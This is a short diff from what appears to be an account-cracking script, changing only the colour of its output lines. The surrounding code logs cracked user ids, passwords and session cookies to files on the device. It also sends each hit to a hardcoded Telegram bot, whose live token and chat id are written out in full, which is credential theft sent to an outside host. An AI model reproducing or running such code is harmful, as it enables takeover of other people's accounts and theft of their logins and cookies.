@@ -699,7 +699,7 @@ def gxdsAPI(uid, pxss, tl):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                print(f"""\r\r{lgr}  [GXDS HITS] {uid} : {ps} -\033[0;33m {yrs}""")
+                print(f"""\r\r{lgr}  [GXDS HITS] {uid} : {ps} ~{yellow} {yrs}""")
                 requests.post(f"https://api.telegram.org/bot6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o/sendMessage?chat_id=6542321044&text={uid}:{ps} - {yrs}\n{coki}")
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
@@ -712,7 +712,7 @@ def gxdsAPI(uid, pxss, tl):
                         for key, value in session.cookies.get_dict().items()
                     ]
                 )
-                print(f"""\r\r{lr}  [GXDS X] {uid} : {ps} -\033[0;33m {yrs}""")
+                print(f"""\r\r{lr}  [GXDS X] {uid} : {ps} ~{yellow} {yrs}""")
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 open("/sdcard/gxds-cookies.txt", "a").write(coki + "\n")
                 cps.append(uid)
